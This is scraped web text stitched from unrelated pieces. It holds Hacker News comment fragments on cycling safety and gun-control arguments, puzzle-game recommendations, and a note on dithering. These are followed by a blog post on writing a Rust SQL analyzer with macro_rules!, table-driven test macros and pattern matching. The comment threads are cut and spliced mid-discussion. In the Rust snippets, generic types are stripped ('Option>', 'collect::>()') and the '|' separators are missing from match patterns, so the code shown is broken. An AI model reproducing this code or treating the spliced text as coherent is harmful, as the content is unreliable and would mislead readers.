The root of the problem is something else and the thing being blamed flippantly can be much less of a worry if the root problem is addressed. People dismiss the guns don't kill people argument because it fits a simplistic ideological talking point, but it's just a basic fact that whether guns are accessible or not, the people accessing them will be the cause of fatalities if there's something wrong with their conduct and context.

You having a bicycle is dangerous because of other people. reply adriand 17 hours agorootparentprev> How is this any different than \"guns don't kill people, people kill people?\" In terms of guns, the reality is that people with guns kill people. An intent to kill plus an instrument designed to do so easily is often a lethal combination. People don't just kill each other more often when they have access to a firearms, they are also far more likely to kill themselves. [1] The risk to cyclists and other road users also comes about by way of a combination of factors: poorly designed roads, lack of protected cycling lanes, lack of adequate pedestrian infrastructure, oversized vehicles, distracted drivers and so on. I suspect there are also a fair number of cases where cyclists/pedestrians make mistakes or engage in risky behaviour. As a society, I don't think there is too much we can do in terms of altering people's behaviour. We can, however, do a great deal to alter the built environment to slow cars down and make things safer for other road users. Plenty of cities have made huge progress with this. There remain plenty that are terrible, and in my experience, many of the worst ones are in America. I think the last American city I was in was Vegas and my gosh, I would never want to cycle there. By contrast, I recently visited Montreal and was stunned by how good the cycling infrastructure was. 1: https://med.stanford.edu/news/all-news/2020/06/handgun-owner... reply parineum 17 hours agorootparent> People don't just kill each other more often when they have access to a firearms, they are also far more likely to kill themselves. [1] Your footnote doesn't support the first statement you made which I don't think is accurate, at least not to a significant degree. reply ToucanLoucan 17 hours agorootparentprevI mean, that statement is also true. And a huge number of gun deaths involve the shooter and victim being the same person. One would argue it's a similar situation even further in that the SUV/Truck also isn't the problem, it's the inattentive driver that runs a person over. If you have a vehicle with the worst safety ratings on the market driven through a crowded city by someone who is adept at driving, there will likely not be an issue, just like if you have a responsible gun owner going to the range every week to fire off a few rounds, you likely won't have an issue. People are always the problem. The regulations at play are generally built around the idea that if you don't give fallible people access to things that are either dangerous when handled by those unprepared, like an oversized truck, or things that are just designed to kill when someone doesn't really need one, that you minimize the chances of something going wrong. https://www.hsph.harvard.edu/means-matter/means-matter/saves... reply rakoo 18 hours agorootparentprevCycling is not dangerous because of nature, it's dangerous because of cars.

One of them was in 2 accidents 5 years apart. Certainly, legally, the cars were in the wrong every time... But the cyclists' mentality shocked me... They _expected_ the cars to respect they were there (and in one case they had their head down in a bike lane and didn't see the car pull out in the intersection to make a right turn) and were completely shocked when they get into an (avoidable) accident. I certainly have nearly been in LOTS of accidents on my motorcycle around the DC beltway and interstates, but I dodged every one by understanding that other drivers are selfish and inattentive, keeping my bike in a lower gear & revved in heavy traffic, and watching out for myself.

The first facilitates problem solving, the second interferes with it. Look up blame-free post-mortems of problems in the IT world, for example. Blaming is similar to a victim perspective, IMHO: 'I'm innocent (most important) and injured; the other person is guilty; therefore I can take out my frustration, etc. on them - I can do to them whatever I want.' It often is more about satisfying anger, protection from shame and other consequences, and is a distraction from problem solving. And those blamed, as here on HN, are often the people who are most socially acceptable to blame - whoever is unpopular and vulnerable in the current crowd.

Not a chance. The political momentum in the US overwhelmingly does not want to fix this to the degree where cars and bikes wouldn't cross paths. Nor have I seen any proposals to do so. Even the most progressive bike infrastructure in the US still often intersects with vehicle traffic at grade. There's only one place in the US where you can reasonably ride a bicycle for transportation and (usually) not share the road with cars, and it's a tiny island with population ~500 that banned cars in the late 19th century.

For comparison, cars were 11 per billion miles. Around 2/3rds of bicycle fatalities involved a motor vehicle.

See page 39 of https://www.ntsb.gov/safety/safety-studies/Documents/SS1901.... reply sottol 15 hours agorootparentI don't think you can 1:1 compare those stats. Most people just wouldn't have the time to travel as far by bike as they do by car, even if they wanted to. They'd take some other form of transit for long drives. Car drivers do 13500 miles/year on average, even at a very sporty 20mi/h per (average!) a cyclist would have to ride full 29 days/year non-stop to match that. Thus, a better measure would be accidents/hour of operation. I bet most avid cyclists do100k.

But when you compare cars vs. bicycles on the same road, together, bicyclists are in more danger. I can only surmise the people that tell you “bicycles are dangerous,” are just looking out for your well being and meant “you’re putting yourself in danger.” Unfortunately, roads were designed for cars first. Even more unfortunate, people are not accustomed to sharing the road with bicyclists and only glance at their mirrors to check for large familiar cars. Thus, to say that “cars are the ones that are dangerous,” implies you think bicyclists have the de facto right of way and everyone should adjust to your presence. reply bwestergard 18 hours agorootparentIn the U.S., roads were paved for cyclists first.

The car driver is assumed to be at fault. In absence of other evidence, the car driver is always 100% at fault for the accident. Including all consequences for hitting/killing someone. 2. If it is proved that the cyclist broke the law and acted negligently, the car driver is still 50% at fault for the accident, since they’re driving a more dangerous vehicle and should’ve actively prevented the accident. People were extremely respectful to cyclists there, and gave a ton of space when passing reply kube-system 2 hours agorootparentprev> must follow the same road laws as cars. This actually isn't true in some parts of the US. Cyclists sometimes do have different laws that apply to them while using the road.

They do not have to stop at them. https://en.wikipedia.org/wiki/Idaho_stop reply alpaca128 9 hours agorootparentprevWhen a vehicle would have to cross other paths (bike lanes etc), the priority is: pedestrian > cyclist > car. A bike lane crossing the road always has priority over cars unless signs say otherwise. At least that's how it works in Europe. > who do you think those long stretches of roads are designed for if not cars? The roads are usually intended for cars, yes. But they often aren't designed for safe, efficient travel with cars. Or anyone else, really. It's possible to design roads to be safe for everyone, but they often are the opposite.

I literally had no idea so much went into the dithering, my presumption was there was just an off the shelf posterization filter applied. The end result looks fantastic and managed to give me wild nostalgia for playing games like The Manhole on my friends Macintosh Classic as a kid. One of my favorite games ever, my wife and I played through it together.

According to Steam stats, it's been a huge success for them, which surprised me and has given me hope for the state of the gaming scene. The two DLCs have been excellent. They're also working on a sequel set in the 1970s, The Rise of the Golden Idol, due for release in a few days [1].

I'll check it out immediately! reply atombender 48 minutes agorootparentOne of my favourite games ever. Have fun! reply Agingcoder 3 minutes agorootparentprevThank you very much for the list. reply jonesetc 3 hours agorootparentprevA lot of great stuff on there. Random game from last year that feels like it would fit well is Chants of Sennaar. Played though it with my non-gaming partner and we had a blast. reply ronjouch 3 hours agorootparentThanks! Sennaar didn't gel with me, because language-based deduction imply an \"arbitrariness\" (\"wobbliness\"?) and mis-interpretations. To me, this felt frustrating compared to the sharpness of an Obra Dinn deduction. But for others it might be part of the appeal, and at any rate it's undeniably a polished game, so I understand that a lot people enjoy it :) Regarding other similar recommendations I see in-thread and that are not already in the list: - The Outer Wilds: one of my fav games ever (it's at the top of my \"absolute best\" list), but too 3d-mechanically-demanding for a very-non-gamer. - The Witness: same, thus for this \"non-gamers\" list I preferred recommending its excellent 2D little-brother, Taiji :) - Case of the Golden Idol: yeah it's a clear \"play that too if you liked Obra Dinn\", added as Obra Dinn addendum - Lorelei and the Laser eyes: haven't played it yet, will soon! reply jonesetc 2 hours agorootparentLorelei and the Laser eyes was one of my favorite games that I played this past year. I think it might be good for a non-gamer, but they had better absolutely love puzzles. Also some of the puzzles require playing videogames within the main game and I can't remember exactly, but they may not make much sense or be very fun if you don't have experience with like PS1 era horror games. For The Witness, I would recommend tagging it as appropriately not accessible. There is a section that can't be completed at all without hearing, and large chunks of the game that I can't imagine are possible with color blindness. I don't have either of these issues, but running into those things really rubbed me the wrong way. It is a game that seems to value the creators vision above all else and isn't willing to make any sacrifices for the audience. Edit: I realize I misread and thought you were saying you were going to add The Witness to the non-gamer list, which was why I was saying that a disclaimer would be extra useful. Left it anyway. reply ronjouch 1 hour agorootparent> For The Witness, I would recommend tagging it as appropriately not accessible.

I don't have either of these issues, but running into those things really rubbed me the wrong way. It is a game that seems to value the creators vision above all else and isn't willing to make any sacrifices for the audience. For sure, \"uncompromising\" or \"design-opinionated\" are adjectives that fit Jonathan Blow (lead designer & programmer of The Witness) and I doubt he'd object :D. He was asked about these inaccessible puzzles, and from what I remember, his answer was pretty much what you intuited: that he was aware, but unwilling to compromise, in a \"not every art if for everyone and that's fine\" kind of way. And announcing them or having { I am color-blind, I am deaf } accessibility options to adapt could/would have spoiled the surprise, so he went ahead with them. Is it too insensitive / dickish? Maybe, I wouldn't know as I know little of how a vision or hearing-impaired person would feel in front of that. Hey, I'm going to ask a blind friend how he perceives such an attitude: is it \"Yeah it sucks\", or is it \"Whatever, the game isn't actively making fun of disabled people, there's just two sections needing access to certain senses where I'll ask for help, I'm used to it and that's okay\"? Curious to see his take. I still like The Witness for what it is. Maybe I will change my mind someday and will flag my recommendation with an inaccessibility warning, but for now it's in my \"absolute best\" sub-list without caveat. > Lorelei and the Laser eyes was one of my favorite games that I played this past year. I think it might be good for a non-gamer, but they had better absolutely love puzzles. Cool, will try it soon! It's already purchased, I'm just waiting for patches to ship (I'm a \"patient gamer\": I have my dose of coping with bugs from $JOB, so when it comes to games I choose to never play games day/week/month 1, to let them stabilize). If good, might add it to my \"best puzzle games\" sublist, https://ronan.jouchet.fr/games?list=puzzle reply meandthebean 1 hour agorootparentprev> Sennaar didn't gel with me, because language-based deduction imply an \"arbitrariness\" (\"wobbliness\"?) and mis-interpretations After not too far in, you eventually start confirming the meanings of words. Eventually you confirm the meaning of every word of every language. So, while learning a language can be a challenge of interpretation, eventually you do get concrete meanings. Edit: I'd also recommend The Sexy Brutale for your list, it's a time loop detective game. reply JoshTriplett 3 hours agorootparentprev> Sennaar didn't gel with me, because language-based deduction imply an \"arbitrariness\" (\"wobbliness\"?) and mis-interpretations. I definitely found the misinterpretations entertaining. It seems like they went to some amount of effort to anticipate potential misinterpretations, such that discovering those misinterpretations later would lead to amusement. reply lomase 2 hours agorootparentprevI loved the gameplay on \"Her Story\".

I thought that Baba is Lovely at first, but then come the later levels and alas, Baba is Too Much. (With the usual qualifier: for me !

Off the top of my head, check out Lorelei and the Laser eyes, the recent Monkey Island, Case of the Golden Monkey, the two Talos Principle games, maybe The Witness? reply grraaaaahhh 3 hours agorootparentI'd add Chants of Sennaar to this list. It's similar to Case of the Golden Idol/Obra Dinn in that the entire game is about making deductions about the game world, but in this case it's about decoding fantasy languages. reply jsheard 3 hours agorootparentprevThe Outer Wilds (not The Outer Worlds) is also a fantastic game along those lines. Don't read too much about it, you want to go in as blind as possible. reply 0cf8612b2e1e 46 minutes agorootparentI am not sure how well a non gamer would take it. I recall some tricky platforming or timing sections which would be too much. As a matter of fact, I recall I had to cheat to lookup the solution to a puzzle or two, only to discover I had the right idea, but was executing it too poorly to work. reply jsheard 22 minutes agorootparentFWIW they did go back and refine some of the puzzles after launch, so depending on when you played it might be smoother now. reply InsideOutSanta 4 hours agorootparentprevCase of the Golden Monkey sounds fascinating, but almost too secretive.

I wasn't able to get a result that did not blur those beautiful pixels, which is such a shame. Yes, I did go into all those setting menus. reply devit 5 hours agoprevIt looks like none of the proposed approaches work well, and the problem seems to be much more complicated that it looks. I think what might work properly is: - A \"fractal\" dither pattern so that it can be zoomed out and in smoothly and is scale invariant - Doing things in texel space so that both camera movement and object movement works properly - Doing bilinear filtering (perhaps keeping all samples instead of storing the weighted average) or perhaps supersampled rendering of the dithered pattern, and then using some sort of error diffusion pass in screen space (with a compute shader) But not actually sure if this works in practice. If that's not enough, an alternative would be to do things in screen space \"naively\", then reverse map the screen space rendering to texel space (in a resolution-preserving way), and use the information in texel space on the next frame to create a screen space solution compatible to the one in texel space, map it to texel space, etc., effectively building up the fractal per-texel pattern incrementally at runtime.

The goal is to perform static analysis for sql input, including: syntax checks, checks if tables, columns and functions exist. Combining this with an embedded sqlite runtime and the ability to assert conditions in this runtime, creates a really great dev experience for sql. Furthermore, I want to be able to show the user high quality error messages with context, explainations and the ability to mute certain diagnostics. This analysis includes the stages of lexical analysis/tokenisation, the parsing of SQL according to the sqlite documentation1 and the analysis of the resulting constructs. After completing the static analysis part of the project, I plan on writing a lsp server for sql, so stay tuned for that. In the process of the above, I need to write a tokenizer and a parser - both for SQL. While I am nowhere near completion of sqleibniz, I still made some discoveries around rust and the handy features the language provides for developing said software. Macros Macros work different in most languages. However they are used for mostly the same reasons: code deduplication and less repetition. Abstract Syntax Tree Nodes A node for a statement in sqleibniz implementation is defined as follows: Tip The example shows the Literal-node. Token is defined in src/types/mod.rs. 1 2 #[derive(Debug)] 3 /// holds all literal types, such as strings, numbers, etc. 4 pub struct Literal { 5 pub t: Token, 6 } Furthermore all nodes are required to implement the Node-trait, this trait is returned by all parser functions and is later used to analyse the contents of a statement: 1 pub trait Node: std::fmt::Debug { 2 fn token(&self) -> &Token; 3 } Tip std::fmt::Debug is used as a super trait for the Node-trait here, see Using Supertraits to Require One Trait’s Functionality Within Another Trait TLDR: using a super trait enables us to only allow implementations of the Node trait if the type already satisfies the std::fmt::Debug trait. Code duplication Thus every node not only has to be defined, but an implementation for the Node-trait has to be written. This requires a lot of code duplication and rust has a solution for that. I want a macro that is able to: define a structure with a given identifier and a doc comment add arbitrary fields to the structure satisfying the Node trait by implementing fn token(&self) -> &Token Lets take a look at the full code I need the macro to produce for the Literal and the Explain nodes. While the first one has no further fields except the Token field t, the second node requires a child field with a type. 1 #[derive(Debug)] 2 /// holds all literal types, such as strings, numbers, etc. 3 pub struct Literal { 4 /// predefined for all structures defined with the node! macro 5 pub t: Token, 6 } 7 impl Node for Literal { 8 fn token(&self) -> &Token { 9 &self.t 10 } 11 } 12 13 14 #[derive(Debug)] 15 /// Explain stmt, see: https://www.sqlite.org/lang_explain.html 16 pub struct Explain { 17 /// predefined for all structures defined with the node! macro 18 pub t: Token, 19 pub child: Option>, 20 } 21 impl Node for Explain { 22 fn token(&self) -> &Token { 23 &self.t 24 } 25 } I want the above to be generated from the following two calls: 1 node!( 2 Literal, 3 \"holds all literal types, such as strings, numbers, etc.\", 4 ); 5 node!( 6 Explain, 7 \"Explain stmt, see: https://www.sqlite.org/lang_explain.html\", 8 child: Option>, 9 ); Code deduplication with macros The macro for that is fairly easy, even if the rust macro docs arent that good: 1 macro_rules! node { 2 ($node_name:ident,$documentation:literal,$($field_name:ident:$field_type:ty),*) => { 3 #[derive(Debug)] 4 #[doc = $documentation] 5 pub struct $node_name { 6 /// predefined for all structures defined with the node! macro, holds the token of the ast node 7 pub t: Token, 8 $( 9 pub $field_name: $field_type, 10 )* 11 } 12 impl Node for $node_name { 13 fn token(&self) -> &Token { 14 &self.t 15 } 16 } 17 }; 18 } Lets disect this macro. The Macro argument/metavariable definition starts with $node_name:ident,$documentation:literal: 1 $node_name : ident , $documentation : literal 2 ^^^^^^^^^^ ^ ^^^^^ ^ 3|| 4|metavariable delimiter 5|6| metavariable type 7| 8metavariable type delimiter 910 metavariable name Meaning, we define the first metavariable of the macro to be a valid identifier rust accepts and the second argument to be a literal. A literal refers to a literal expression, such as chars, strings or raw strings. Tip For the literal and the ident meta variable types, see Literal expressions and Identifiers. For the whole metavariable type reference, see Metavariables. The tricky part that took me some time to grasp is the way of defining repetition of metavariables in macros, specifically $($field_name:ident:$field_type:ty),*. 1 $($field_name:ident:$field_type:ty),* 2 ^^ ^ ^ ^ 3|| 4metavariablerepetition 5delimiter(any) 6 || 7 sub group of metavariables As I understand, we define a subgroup in our metavarible definition and postfix it with its repetition. We use : to delimit inside the metavariable sub-group, this enables us to write the macro in a convienient field_name: type way: 1 node!( 2 Example, 3 \"Example docs\", 4 5 // sub group start 6 field_name: &'static str, 7 field_name1: String 8 // sub group end 9 ); We can use the $(...)* syntax to “loop over” our sub grouped metavariables, and thus create all fields with their respective names and types: 1 pub struct $node_name { 2 pub t: Token, 3 $( 4 pub $field_name: $field_type, 5 )* 6 } Tip See Repetitions for the metavariable repetition documentation. Remember: the $documentation metavariable holds a literal containing our doc string we want to generate for our node - we now use the #[doc = ...] annotation instead of the commonly known /// ... syntax to pass our macro metavariable to the compiler: 1 #[doc = $documentation] 2 pub struct $node_name { 3 // ... 4 } I’d say the trait implementation for each node is pretty self explanatory. Testing Lets start off with me saying: I love table driven tests and the way Go allows to write them: 1 func TestLexerWhitespace(t *testing.T) { 2 cases := []string{\"\",\"\\t\", \"\\r\", \" \"} 3 for _, c := range cases { 4 t.Run(c, func (t *testing.T) { 5 l := Lexer{} 6 l.init(c) 7 l.run() 8 }) 9 } 10 } In Go, I define an array of cases and just execute a test function for each case c. As far as I know, Rust does not offer a similar test method - so made one 😼. Lexer / Tokenizer Tests 1 #[cfg(test)] 2 mod should_pass { 3 test_group_pass_assert! { 4 string, 5 string: \"'text'\"=vec![Type::String(String::from(\"text\"))], 6 empty_string: \"''\"=vec![Type::String(String::from(\"\"))], 7 string_with_ending: \"'str';\"=vec![Type::String(String::from(\"str\")), Type::Semicolon] 8 } 9 10 // ... 11 } 12 13 #[cfg(test)] 14 mod should_fail { 15 test_group_fail! { 16 empty_input, 17 empty: \"\", 18 empty_with_escaped: \"\\\\\", 19 empty_with_space: \" \\t\\r\" 20 } 21 22 // ... 23 } Executing these via cargo test, results in the same output I love from table driven tests in Go, each function having its own log and feedback (ok/fail): 1 running 68 tests 2 test lexer::tests::should_pass::string::empty_string ... ok 3 test lexer::tests::should_pass::string::string ... ok 4 test lexer::tests::should_pass::string::string_with_ending ... ok 5 test lexer::tests::should_fail::empty_input::empty ... ok 6 test lexer::tests::should_fail::empty_input::empty_with_escaped ... ok 7 test lexer::tests::should_fail::empty_input::empty_with_space ... ok 8 9 test result: ok. 68 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out; 10 finished in 0.00s The macro accepts the name of the test group, for example: booleans and string and a list of input and expected output pairs. The input is passed to the Lexer initialisation and the output of the Lexer.run() is compared against the expected output. Inlining the test_group_pass_assert! call for string results in the code below. Before asserting the equality of the resulting token types and the expected token types, a transformation is necessary, I map over the token vector and only return their types. 1 mod string { 2 use crate::{lexer, types::Type}; 3 4 #[test] 5 fn string() { 6 let input = \"'text'\".as_bytes().to_vec(); 7 let mut l = lexer::Lexer::new(&input, \"lexer_tests_pass\"); 8 let toks = l.run(); 9 assert_eq!(l.errors.len(), 0); 10 assert_eq!( 11 toks.into_iter().map(|tok| tok.ttype).collect::>(), 12 (vec![Type::String(String::from(\"text\"))]) 13 ); 14 } 15 16 #[test] 17 fn empty_string() { 18 let input = \"''\".as_bytes().to_vec(); 19 let mut l = lexer::Lexer::new(&input, \"lexer_tests_pass\"); 20 let toks = l.run(); 21 assert_eq!(l.errors.len(), 0); 22 assert_eq!( 23 toks.into_iter().map(|tok| tok.ttype).collect::>(), 24 (vec![Type::String(String::from(\"\"))]) 25 ); 26 } 27 28 #[test] 29 fn string_with_ending() { 30 let input = \"'str';\".as_bytes().to_vec(); 31 let mut l = lexer::Lexer::new(&input, \"lexer_tests_pass\"); 32 let toks = l.run(); 33 assert_eq!(l.errors.len(), 0); 34 assert_eq!( 35 toks.into_iter().map(|tok| tok.ttype).collect::>(), 36 (vec![Type::String(String::from(\"str\")), Type::Semicolon]) 37 ); 38 } 39 } The counter part test_group_fail! for empty_input! produces the code below. The main difference being the assertion of the resulting token vector to be empty and the Lexer.errors field to contain at least on error. 1 mod empty_input { 2 use crate::lexer; 3 4 #[test] 5 fn empty() { 6 let source = \"\".as_bytes().to_vec(); 7 let mut l = lexer::Lexer::new(&source, \"lexer_tests_fail\"); 8 let toks = l.run(); 9 assert_eq!(toks.len(), 0); 10 assert_ne!(l.errors.len(), 0); 11 } 12 13 #[test] 14 fn empty_with_escaped() { 15 let source = \"\\\\\".as_bytes().to_vec(); 16 let mut l = lexer::Lexer::new(&source, \"lexer_tests_fail\"); 17 let toks = l.run(); 18 assert_eq!(toks.len(), 0); 19 assert_ne!(l.errors.len(), 0); 20 } 21 22 #[test] 23 fn empty_with_space() { 24 let source = \" \\t\\r\".as_bytes().to_vec(); 25 let mut l = lexer::Lexer::new(&source, \"lexer_tests_fail\"); 26 let toks = l.run(); 27 assert_eq!(toks.len(), 0); 28 assert_ne!(l.errors.len(), 0); 29 } 30 } Lets take a look at the macros itself, I will not go into detail around the macro definition - simply because I explained the meta variable declaration in the previous chapter. The first macro is uesd for the assertions of test with valid inputs - test_group_pass_assert!: 1 macro_rules! test_group_pass_assert { 2 ($group_name:ident,$($ident:ident:$input:literal=$expected:expr),*) => { 3 mod $group_name { 4 use crate::{lexer, types::Type}; 5 6 $( 7 #[test] 8 fn $ident() { 9 let input = $input.as_bytes().to_vec(); 10 let mut l = lexer::Lexer::new(&input, \"lexer_tests_pass\"); 11 let toks = l.run(); 12 assert_eq!(l.errors.len(), 0); 13 assert_eq!(toks.into_iter().map(|tok| tok.ttype).collect::>(), $expected); 14 } 15 )* 16 } 17 }; 18 } While the second is used for invalid inputs and edge case testing with expected errors - test_group_fail!: 1 macro_rules! test_group_fail { 2 ($group_name:ident,$($name:ident:$value:literal),*) => { 3 mod $group_name { 4 use crate::lexer; 5 $( 6 #[test] 7 fn $name() { 8 let source = $value.as_bytes().to_vec(); 9 let mut l = lexer::Lexer::new(&source, \"lexer_tests_fail\"); 10 let toks = l.run(); 11 assert_eq!(toks.len(), 0); 12 assert_ne!(l.errors.len(), 0); 13 } 14 )* 15 } 16 }; 17 } Parser Tests I use the same concepts and almost the same macros in the parser module to test the results the parser produces, but this time focussing on edge cases and full sql statements. For instance the tests expected to pass and to fail for the EXPLAIN sql statement: 1 #[cfg(test)] 2 mod should_pass { 3 test_group_pass_assert! { 4 sql_stmt_prefix, 5 explain: r#\"EXPLAIN VACUUM;\"#=vec![Type::Keyword(Keyword::EXPLAIN)], 6 explain_query_plan: r#\"EXPLAIN QUERY PLAN VACUUM;\"#=vec![Type::Keyword(Keyword::EXPLAIN)] 7 } 8 } 9 10 #[cfg(test)] 11 mod should_fail { 12 test_group_fail! { 13 sql_stmt_prefix, 14 explain: r#\"EXPLAIN;\"#, 15 explain_query_plan: r#\"EXPLAIN QUERY PLAN;\"# 16 } 17 } Both macros get the sql_stmt_prefix as their module names, because thats the function, in the parser, responsible for the EXPLAIN statement. The failing tests check wheter the parser correctly asserts the conditions the sql standard lays out, see sqlite - sql-stmt. Specifically, either that a statement follows after the EXPLAIN identifier or the QUERY PLAN and a statement follow. The difference between these tests and the tests for the lexer are in the way the assertions are made. Take a look at the code the macros produce: 1 #[cfg(test)] 2 mod should_pass { 3 mod sql_stmt_prefix { 4 use crate::{lexer, parser::Parser, types::Keyword, types::Type}; 5 6 #[test] 7 fn explain() { 8 let input = r#\"EXPLAIN VACUUM;\"#.as_bytes().to_vec(); 9 let mut l = lexer::Lexer::new(&input, \"parser_test_pass\"); 10 let toks = l.run(); 11 assert_eq!(l.errors.len(), 0); 12 let mut parser = Parser::new(toks, \"parser_test_pass\"); 13 let ast = parser.parse(); 14 assert_eq!(parser.errors.len(), 0); 15 assert_eq!( 16 ast.into_iter() 17 .map(|o| o.unwrap().token().ttype.clone()) 18 .collect::>(), 19 (vec![Type::Keyword(Keyword::EXPLAIN)]) 20 ); 21 } 22 23 #[test] 24 fn explain_query_plan() { 25 let input = r#\"EXPLAIN QUERY PLAN VACUUM;\"#.as_bytes().to_vec(); 26 let mut l = lexer::Lexer::new(&input, \"parser_test_pass\"); 27 let toks = l.run(); 28 assert_eq!(l.errors.len(), 0); 29 let mut parser = Parser::new(toks, \"parser_test_pass\"); 30 let ast = parser.parse(); 31 assert_eq!(parser.errors.len(), 0); 32 assert_eq!( 33 ast.into_iter() 34 .map(|o| o.unwrap().token().ttype.clone()) 35 .collect::>(), 36 (vec![Type::Keyword(Keyword::EXPLAIN)]) 37 ); 38 } 39 } 40 } As shown, the test_group_pass_assert! macro in the parser module starts with the same Lexer initialisation and empty error vector assertion. However, the next step is to initialise the Parser structure and after parsing assert the outcome - i.e. no errors and nodes with the correct types. 1 #[cfg(test)] 2 mod should_fail { 3 mod sql_stmt_prefix { 4 use crate::{lexer, parser::Parser}; 5 #[test] 6 fn explain() { 7 let input = r#\"EXPLAIN;\"#.as_bytes().to_vec(); 8 let mut l = lexer::Lexer::new(&input, \"parser_test_fail\"); 9 let toks = l.run(); 10 assert_eq!(l.errors.len(), 0); 11 let mut parser = Parser::new(toks, \"parser_test_fail\"); 12 let _ = parser.parse(); 13 assert_ne!(parser.errors.len(), 0); 14 } 15 16 #[test] 17 fn explain_query_plan() { 18 let input = r#\"EXPLAIN QUERY PLAN;\"#.as_bytes().to_vec(); 19 let mut l = lexer::Lexer::new(&input, \"parser_test_fail\"); 20 let toks = l.run(); 21 assert_eq!(l.errors.len(), 0); 22 let mut parser = Parser::new(toks, \"parser_test_fail\"); 23 let _ = parser.parse(); 24 assert_ne!(parser.errors.len(), 0); 25 } 26 } 27 } The test_group_fail! macro also extends the same macro from the lexer module and appends the check for errors after parsing. Both macro_rules!: 1 macro_rules! test_group_pass_assert { 2 ($group_name:ident,$($ident:ident:$input:literal=$expected:expr),*) => { 3 mod $group_name { 4 use crate::{lexer, parser::Parser, types::Type, types::Keyword}; 5 $( 6 #[test] 7 fn $ident() { 8 let input = $input.as_bytes().to_vec(); 9 let mut l = lexer::Lexer::new(&input, \"parser_test_pass\"); 10 let toks = l.run(); 11 assert_eq!(l.errors.len(), 0); 12 13 let mut parser = Parser::new(toks, \"parser_test_pass\"); 14 let ast = parser.parse(); 15 assert_eq!(parser.errors.len(), 0); 16 assert_eq!(ast.into_iter() 17 .map(|o| o.unwrap().token().ttype.clone()) 18 .collect::>(), $expected); 19 } 20 )* 21 } 22 }; 23 } 24 25 macro_rules! test_group_fail { 26 ($group_name:ident,$($ident:ident:$input:literal),*) => { 27 mod $group_name { 28 use crate::{lexer, parser::Parser}; 29 $( 30 #[test] 31 fn $ident() { 32 let input = $input.as_bytes().to_vec(); 33 let mut l = lexer::Lexer::new(&input, \"parser_test_fail\"); 34 let toks = l.run(); 35 assert_eq!(l.errors.len(), 0); 36 37 let mut parser = Parser::new(toks, \"parser_test_fail\"); 38 let _ = parser.parse(); 39 assert_ne!(parser.errors.len(), 0); 40 } 41 )* 42 } 43 }; 44 } Macro Pitfalls rust-analyzer plays badly inside macro_rules! no real intellisense no goto definition no hover for signatures of literals and language constructs cargo fmt does not format or indent inside of macro_rules! and macro invokations treesitter (yes I use neovim, btw 😼) and chroma (used on this site) sometimes struggle with syntax highlighting of macro_rules! documentation is sparse at best Matching Characters When writing a lexer, comparing characters is the part everything else depends on. Rust makes this enjoyable via the matches! macro and the patterns the match statement accepts. For instance, checking if the current character is a valid sqlite number can be done by a simple matches! macro invocation: 1 /// Specifically matches https://www.sqlite.org/syntax/numeric-literal.html 2 fn is_sqlite_num(&self) -> bool { 3 matches!(self.cur(), 4 // exponent notation with +- 5 '+''6 // sqlite allows for separating numbers by _ 7 '_'8 // floating point 9 '.'10 // hexadecimal 11 'a'..='f''A'..='F'12 // decimal 13 '0'..='9') 14 } Similarly testing for identifiers is as easy as the above: 1 fn is_ident(&self, c: char) -> bool { 2 matches!(c, 'a'..='z''A'..='Z''_''0'..='9') 3 } Symbol detection in the main loop of the lexer works exactly the same: 1 pub fn run(&mut self) -> Vec { 2 let mut r = vec![]; 3 while !self.is_eof() { 4 match self.cur() { 5 // skipping whitespace 6 '\\t''\\r'' ''' => {} 7 '*' => r.push(self.single(Type::Asteriks)), 8 ';' => r.push(self.single(Type::Semicolon)), 9 ',' => r.push(self.single(Type::Comma)), 10 '%' => r.push(self.single(Type::Percent)), 11 _ => { 12 // omitted error handling for unknown symbols 13 panic!(\"whoops\"); 14 } 15 } 16 self.advance(); 17 } 18 r 19 } Patterns in match statement and matches blocks are arguably the most useful feature of Rust. Matching Tokens Once the lexer converts the character stream into a stream of Token structure instances with positional and type information, the parser can consume this stream and produce an abstract syntax tree. The parser has to recognise patterns in its input by detecting token types. This again is a case where Rusts match statement shines. Each Token contains a t field for its type, see below. 1 pub use self::keyword::Keyword; 2 3 #[derive(Debug, PartialEq, Clone)] 4 pub enum Type { 5 Keyword(keyword::Keyword), 6 Ident(String), 7 Number(f64), 8 String(String), 9 Blob(Vec), 10 Boolean(bool), 11 ParamName(String), 12 Param(usize), 13 14 Dot, 15 Asteriks, 16 Semicolon, 17 Percent, 18 Comma, 19 20 Eof, 21 } Lets look at the sql_stmt_prefix method of the parser. This function parses the EXPLAIN statement, which - according to the sqlite documentation - prefixes all other sql statements, hence the name. The corresponding syntax diagram is shown below: The implementation follows this diagram. The Explain stmt is optional, thus if the current token type does not match Type::Keyword(Keyword::EXPLAIN), we call the sql_stmt function to processes the statements on the right of the syntax diagram. If the token matches it gets consumed and the next check is for the second possible path in the EXPLAIN diagram: QUERY PLAN. This requires both the QUERY and the PLAN keywords consecutively - both are consumed. 1 impl Parser { 2 fn sql_stmt_prefix(&mut self) -> Option> { 3 match self.cur()?.ttype { 4 Type::Keyword(Keyword::EXPLAIN) => { 5 let mut e = Explain { 6 t: self.cur()?.clone(), 7 child: None, 8 }; 9 self.advance(); // skip EXPLAIN 10 11 // path for EXPLAIN->QUERY->PLAN 12 if self.is(Type::Keyword(Keyword::QUERY)) { 13 self.consume(Type::Keyword(Keyword::QUERY)); 14 self.consume(Type::Keyword(Keyword::PLAN)); 15 } // else path is EXPLAIN->*_stmt 16 17 e.child = self.sql_stmt(); 18 Some(Box::new(e)) 19 } 20 _ => self.sql_stmt(), 21 } 22 } 23 } This shows the basic usage of pattern matching in the parser. An other example is the literal_value function, its sole purpose is to create the Literal node for all literals. It discards most embedded enum values, but checks for some specific keywords, because they are considered keywords, while being literals: 1 impl Parser { 2 /// see: https://www.sqlite.org/syntax/literal-value.html 3 fn literal_value(&mut self) -> Option> { 4 let cur = self.cur()?; 5 match cur.ttype { 6 Type::String(_) 7Type::Number(_) 8Type::Blob(_) 9Type::Keyword(Keyword::NULL) 10Type::Boolean(_) 11Type::Keyword(Keyword::CURRENT_TIME) 12Type::Keyword(Keyword::CURRENT_DATE) 13Type::Keyword(Keyword::CURRENT_TIMESTAMP) => { 14 let s: Option> = Some(Box::new(Literal { t: cur.clone() })); 15 self.advance(); 16 s 17 } 18 _ => { 19 // omitted error handling for invalid literals 20 panic!(\"whoops\"); 21 } 22 } 23 } 24 } Fancy error display While the implementation itself is repetitive and not that interesting, I still wanted to showcase the way both the lexer and the parser handle errors and how these errors are displayed to the user. A typical error would be to miss a semicolon at the end of a sql statement: 1 -- 